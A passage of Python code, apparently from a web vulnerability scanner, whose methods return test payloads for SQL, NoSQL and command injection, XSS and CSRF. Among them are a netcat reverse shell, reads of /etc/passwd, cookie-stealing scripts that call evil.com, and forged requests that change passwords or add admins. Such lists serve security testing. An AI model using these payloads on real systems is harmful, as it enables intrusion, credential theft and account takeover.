            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a) --",
            "'; WAITFOR DELAY '0:0:5'--",
            "'; SELECT pg_sleep(5)--"
        ]
    
    def _load_nosql_injection_payloads(self) -> List[str]:
        """Load NoSQL injection test payloads"""
        return [
            '{"$gt": ""}',
            '{"$ne": null}',
            '{"$gt": 0}',
            '{"$where": "this.password.match(/.*/)"}',
            '{"$regex": ".*"}',
            '{"$exists": true}',
            '{"$elemMatch": {"$exists": true}}',
            '{"user": {"$regex": "admin", "$options": "i"}}',
            '{"user": {"$in": ["admin"]}}',
            '{"$where": "sleep(5000)"}',
            '{"$where": "function(){return true}"}',
            '{"username": {"$in":["admin", "administrator", "root"]}}',
            '{"$or": [{"username": "admin"}, {"username": "administrator"}]}',
            '{"username":{"$regex":"(?i)^adm"}}',
            '{"username": {"$nin": []}}',
            '{"$where": "this.credits > this.debits"}'
        ]
    
    def _load_command_injection_payloads(self) -> List[str]:
        """Load command injection test payloads"""
        return [
            "; ls -la",
            "& ls -la",
            "| ls -la",
            "; cat /etc/passwd",
            "& cat /etc/passwd",
            "| cat /etc/passwd",
            "; id",
            "& id",
            "| id",
            "`ls -la`",
            "$(ls -la)",
            "; sleep 5",
            "& sleep 5",
            "| sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "; ping -c 3 127.0.0.1",
            "& ping -c 3 127.0.0.1",
            "| ping -c 3 127.0.0.1",
            "; echo 'vulnerable' > test.txt",
            "& echo 'vulnerable' > test.txt",
            "| echo 'vulnerable' > test.txt",
            "|| true",
            "& true",
            "' ; whoami; '",
            "' & whoami; '",
            "' | whoami; '",
            "; nc -e /bin/sh 127.0.0.1 4444",
            "& nc -e /bin/sh 127.0.0.1 4444",
            "| nc -e /bin/sh 127.0.0.1 4444"
        ]
    
    def _load_xss_payloads(self) -> List[str]:
        """Load XSS test payloads"""
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\">",
            "\"><script>alert('XSS')</script>",
            "'-alert('XSS')-'",
            "\"><img src=x onerror=alert('XSS')>",
            "<script>fetch('https://evil.com?cookie='+document.cookie)</script>",
            "<script>document.location='https://evil.com?cookie='+document.cookie</script>",
            "<img src=1 href=1 onerror=\"javascript:alert('XSS')\">",
            "<audio src=1 onerror=alert('XSS')>",
            "<video src=1 onerror=alert('XSS')>",
            "<body background=\"javascript:alert('XSS')\">",
            "<table background=\"javascript:alert('XSS')\">",
            "<svg/onload=alert('XSS')>",
            "<input autofocus onfocus=alert('XSS')>",
            "javascript:alert('XSS')",
            "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\"</textarea><img src=1 onerror='alert(1)'>\">"
        ]
    
    def _load_csrf_payloads(self) -> List[str]:
        """Load CSRF test payloads"""
        return [
            "<form action=\"http://vulnerable-site.com/change_password\" method=\"POST\">\n<input type=\"hidden\" name=\"new_password\" value=\"attacker_password\">\n</form>\n<script>document.forms[0].submit();</script>",
            "<form action=\"http://vulnerable-site.com/transfer\" method=\"POST\">\n<input type=\"hidden\" name=\"amount\" value=\"1000\">\n<input type=\"hidden\" name=\"recipient\" value=\"attacker\">\n</form>\n<script>document.forms[0].submit();</script>",
            "<img src=\"http://vulnerable-site.com/logout\" style=\"display:none\">",
            "<img src=\"http://vulnerable-site.com/delete_account\" style=\"display:none\">",
            "<iframe src=\"http://vulnerable-site.com/csrf-vulnerable-page\" style=\"display:none\"></iframe>",
            "<script>fetch('http://vulnerable-site.com/change_email', {method: 'POST', body: new URLSearchParams({email: 'attacker@evil.com'}), credentials: 'include'});</script>",
            "<script>fetch('http://vulnerable-site.com/add_admin', {method: 'POST', body: new URLSearchParams({username: 'attacker'}), credentials: 'include'});</script>"
        ]
